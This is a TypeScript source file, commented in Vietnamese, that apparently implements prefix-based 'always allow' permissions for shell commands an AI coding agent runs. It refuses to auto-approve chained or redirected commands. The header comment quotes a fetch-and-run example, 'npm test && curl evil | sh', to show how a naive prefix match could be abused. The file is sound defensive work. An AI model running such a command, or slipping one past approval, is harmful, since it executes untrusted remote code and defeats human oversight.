/**
 * ============================================================
 * QUYỀN THEO TIỀN TỐ LỆNH — "luôn cho phép `npm test …`" (đợt 3, 18/10/2026)
 * ============================================================
 *
 * `quyenLau.ts` nhớ NGUYÊN VĂN chuỗi lệnh: duyệt `npm test` rồi agent chạy
 * `npm test -- foo.test.ts` là hỏi lại. Claude Code có `Bash(npm test:*)`. Ở
 * đây khoá dạng `tien-to:<chuỗi>` khớp mọi lệnh BẮT ĐẦU bằng chuỗi đó — nhưng
 * chỉ khi lệnh là MỘT lệnh đơn. Thiếu điều kiện thứ hai thì "luôn cho phép
 * `npm test`" thành "luôn cho phép `npm test && curl evil | sh`".
 *
 * ─── CHẶN NỐI LỆNH ───
 * Lệnh khớp tiền tố phải KHÔNG chứa bất kỳ ký tự nào shell dùng để chạy thêm
 * một lệnh khác hoặc chuyển hướng: `;` `&` `|` `` ` `` `$(` `$` `>` `<` `(` `)`
 * `{` `}` xuống dòng, và `\` (thoát dòng / ký tự). Bỏ cả `$` trần vì `${IFS}`,
 * `$VAR` có thể bị dùng để dựng lệnh. Lệnh có các ký tự đó vẫn chạy được —
 * chỉ là KHÔNG tự duyệt, mà hỏi như thường.
 *
 * Tiền tố phải khớp theo RANH GIỚI TỪ: `npm test` khớp `npm test` và
 * `npm test -- x`, KHÔNG khớp `npm testx` (một script khác tên).
 *
 * Lệnh mức `cankiem`/`nguyhiem` KHÔNG BAO GIỜ được nhớ (bên gọi truyền
 * `choNho: false`), nên tiền tố không thể mở đường cho `rm -rf`, `sudo`…
 */

/** Khoá trong `quyenLau`/`quyenDaCap` là chuỗi; tiền tố mang đầu này. */
export const DAU_TIEN_TO = 'tien-to:';

/** Ký tự nối/chuyển hướng/thay thế — có mặt là KHÔNG tự duyệt theo tiền tố. */
const KY_TU_NOI = /[;&|`$<>(){}\n\r\\]/;

/** Lệnh là một lệnh đơn, không nối, không chuyển hướng. */
export function laLenhDon(lenh: string): boolean {
  return !KY_TU_NOI.test(lenh);
}

/** Chuẩn hoá khoảng trắng: `npm   test` ≡ `npm test`. */
function gon(s: string): string {
  return s.trim().replace(/\s+/g, ' ');
}

/** Lệnh có khớp tiền tố này không (ranh giới từ + lệnh đơn). */
export function khopTienTo(lenh: string, tienTo: string): boolean {
  // Kiểm NGUYÊN VĂN trước khi gom khoảng trắng — gom trước thì xuống dòng (nối lệnh) biến thành dấu cách và lọt.
  if (!laLenhDon(lenh) || !laLenhDon(tienTo)) return false;
  const l = gon(lenh);
  const t = gon(tienTo);
  if (!t) return false;
  return l === t || l.startsWith(`${t} `);
}

/** Trong một tập khoá, có khoá tiền tố nào cho phép lệnh này không. */
export function choPhepTheoTienTo(khoa: Iterable<string>, lenh: string): string | null {
  if (!laLenhDon(lenh)) return null;
  for (const k of khoa) {
    if (k.startsWith(DAU_TIEN_TO) && khopTienTo(lenh, k.slice(DAU_TIEN_TO.length))) return k;
  }
  return null;
}

/**
 * Tiền tố GỢI Ý cho nút "Luôn cho phép `…`": 2–3 từ đầu.
 *
 * - Trình chạy gói (`npm run x`, `pnpm run x`, `yarn x`, `npx tsc`, `python -m x`,
 *   `cargo test`, `go test`) ⇒ giữ tới tên script/công cụ (3 từ nếu có `run`/`-m`).
 * - Còn lại ⇒ 2 từ (`git status`, `ls -la`) — một từ thì quá rộng (`git` ⇒ cả
 *   `git push --force`), nên lệnh chỉ có MỘT từ thì tiền tố chính là nó.
 * Trả `null` khi lệnh không phải lệnh đơn (không gợi ý gì để nhớ).
 */
export function goiYTienTo(lenh: string): string | null {
  if (!laLenhDon(lenh)) return null;
  const l = gon(lenh);
  if (!l) return null;
  const tu = l.split(' ');
  // Từ bắt đầu bằng `-` sau từ đầu: giữ (vd `ls -la`), nhưng không đi quá 3 từ.
  const dau = tu[0]!.toLowerCase();
  let n = 2;
  if ((['npm', 'pnpm', 'yarn', 'bun'].includes(dau) && tu[1] === 'run') || (/^python3?$/.test(dau) && tu[1] === '-m')) n = 3;
  if (['npx', 'pnpx', 'bunx'].includes(dau) && tu.length >= 2) n = 2;
  const t = tu.slice(0, Math.min(n, tu.length)).join(' ');
  // Tiền tố không được là cả một đường dẫn tuỳ ý dài — trần 80 ký tự.
  return t.length > 80 ? null : t;
}

/** Khoá lưu cho một tiền tố. */
export function khoaTienTo(tienTo: string): string {
  return `${DAU_TIEN_TO}${gon(tienTo)}`;
}

/** Hiện khoá cho người đọc: `tien-to:npm test` ⇒ "`npm test …` (mọi lệnh bắt đầu bằng)". */
export function moTaKhoa(khoa: string): string {
  return khoa.startsWith(DAU_TIEN_TO) ? `${khoa.slice(DAU_TIEN_TO.length)} … (tiền tố)` : khoa;
}
